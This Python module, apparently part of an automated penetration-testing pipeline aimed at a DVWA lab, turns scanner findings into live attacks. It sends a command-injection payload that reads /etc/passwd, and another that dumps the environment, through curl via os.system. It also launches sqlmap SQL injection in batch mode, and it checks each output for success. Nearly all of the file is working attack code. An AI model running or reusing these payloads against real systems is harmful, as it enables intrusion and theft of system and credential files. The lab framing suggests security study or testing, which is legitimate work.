import os, subprocess
import logging
import time

from helpers import get_output_file_name

def execute_attacks(vulnerabilities, ip, cookie, group_name=None, stop_if_success=False):
    vuls = vulnerabilities["results"]
    attack_results = []
    result = None
    for key in vuls.keys():
        for i in range (len(vuls[key])):
            if (key == "Commands execution"):
                logging.info("Launching command execution")
                result = attack_manual_command_exec_passwd(vuls[key][i], ip, cookie=cookie, group_name=group_name)
                # result = attack_manual_command_exec_env(vuls[key][i], ip, cookie=cookie, group_name=group_name)
            if ("SQL Injection" in key):
                # if "sqli" in vuls[key][i]["path"]:
                    # logging.info("Launchin sql injection for key {}".format(key))
                result = attack_sql_manual(vuls[key][i], ip, cookie, group_name=group_name)           
                # else:
                #     result = None #normally never none
            attack_results.append(result)
            if (result and stop_if_success and result["success"]):
                return attack_results
    return attack_results

# TODO standard attack result output
# TODO one of the thigns to print in the end perhaps file location
def attack_manual_command_exec_passwd(vuln, host, cookie=None, group_name=None,
                                        print_output=True):
    start = time.time()
    url = host + vuln["path"]
    param = vuln["parameter"]
    # host = "http://192.168.40.132/"
    # path = "/dvwa/vulnerabilities/exec/"
    # param = "ip"
    payload = "%3Bcat /etc/passwd%3B&Submit=Submit"
    # full_path = host+path
    if not cookie:
        cookie = "PHPSESSID=31bfb288d74780b526cdf950d6246ac4;security=low"
    # url = "http://192.168.40.132/dvwa/vulnerabilities/exec/"
    output_file = get_output_file_name(start, "exec_pw_out", group_name)
    # TODO if cookie and if output
    attack_str = "curl \"{url}\" -e \"{url}\" -d \"{param}={payload}\" --cookie \"{cookie}\""
    attack_str = attack_str.format(
        url=url,
        param=param,
        payload=payload,
        cookie=cookie
    )

    logging.info("Executing command execussion attack with {}".format(attack_str+" > "+output_file +" 2> ./results/exec_pw_err_1"))
    os.system(attack_str+" > "+output_file +" 2> ./results/exec_pw_err_1")

    with open(output_file, 'r') as f:
        output = f.read()
    end = time.time()
    success = True if ("root:x:" in output) else False 

    if print_output:
        print("3,{},{},{},{}".format(end-start, attack_str, output_file,success))
    result = {
        "stage":3, 
        "time":end-start, 
        "settings": attack_str,
        "result_file": output_file,
        "success": success
    }
    return result

def attack_manual_command_exec_env(vuln, host, cookie=None, group_name=None,
                                        print_output=True):
    start = time.time()
    url = host + vuln["path"]
    param = vuln["parameter"]
    # host = "http://192.168.40.132/"
    # path = "/dvwa/vulnerabilities/exec/"
    # param = "ip"
    payload = "%3Benv%3B&Submit=Submit"
    # full_path = host+path
    if not cookie:
        cookie = "PHPSESSID=31bfb288d74780b526cdf950d6246ac4;security=low"
    # url = "http://192.168.40.132/dvwa/vulnerabilities/exec/"
    output_file = get_output_file_name(start, "exec_pw_out", group_name)
    # TODO if cookie and if output
    attack_str = "curl \"{url}\" -e \"{url}\" -d \"{param}={payload}\" --cookie \"{cookie}\""
    attack_str = attack_str.format(
        url=url,
        param=param,
        payload=payload,
        cookie=cookie
    )

    logging.info("Executing command execussion attack with {}".format(attack_str+" > "+output_file +" 2> ./results/exec_pw_err_1"))
    os.system(attack_str+" > "+output_file +" 2> ./results/exec_pw_err_1")

    with open(output_file, 'r') as f:
        output = f.read()
    end = time.time()
    success = True if ("PWD=" in output) else False #Command Injection

    if print_output:
        print("3,{},{},{},{}".format(end-start, attack_str, output_file,success))
    result = {
        "stage":3, 
        "time":end-start, 
        "settings": attack_str,
        "result_file": output_file,
        "success": success
    }
    return result

def attack_sql_manual(vuln, host, cookie=None, group_name=None,
                        print_output=True, os_output=False):
    # TODO make log file universal and passed in
    start = time.time()
    # url = "http://192.168.40.132/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit"
    url = host + vuln["path"] + "?" + vuln["parameter"] + "=1&Submit=Submit"
    if not cookie:
        cookie = "PHPSESSID=efc94e48bd9654e20b48c6b91f928c4f;security=low"
    output_folder = get_output_file_name(start, "sqlmap_out", group_name)
    log_file = get_output_file_name(start, "os_out_sql", group_name)
    attack_str = "sqlmap -u \"{url}\" --cookie=\"{cookie}\" --flush-session --batch --answers=\"\" --output-dir={output}".format(
        url = url,
        cookie = cookie,
        output= output_folder
    )
    os_input = attack_str
    if not os_output:
        os_input += "> {}".format(log_file)
    logging.info("Executing sql injection attack with {}".format(attack_str))
    # os.system(os_input)
    r = subprocess.call(os_input, shell=True, timeout=30)
    # there should only be one url in the output folder
    # TODO add a check
    output_file = output_folder + "/" + os.listdir(output_folder)[0] + "/" + "log"
    with open(output_file, 'r') as f:
        output = f.read()
    success = False
    if output !=None and len(output) != 0: # TODO file not empty
        success = True
    end = time.time()

    if print_output:
        print("3,{},{},{},{}".format(end-start, os_input, output_file,success))
    result = {
        "stage":3, # TODO its ok for these to be formatted uniquely but maybe make it a type or a class
        "time":end-start, 
        "settings": attack_str,
        "result_file": output_file,
        "success": success
    }
    return result


# def command_exec_manual():
#     host = "http://192.168.40.132/"
#     path = "/dvwa/vulnerabilities/exec/"
#     param = "ip"
#     http_request =  "POST /dvwa/vulnerabilities/exec/ HTTP/1.1\nHost: 192.168.40.132\nReferer: http://192.168.40.132/dvwa/vulnerabilities/exec/\nContent-Type: application/x-www-form-urlencoded\n\nip=%3Benv%3B&submit=submit"
#     curl_command = "curl \"http://192.168.40.132/dvwa/vulnerabilities/exec/\" -e \"http://192.168.40.132/dvwa/vulnerabilities/exec/\" -d \"ip=%3Benv%3B&submit=submit\""
# def cross_site_script_manual():

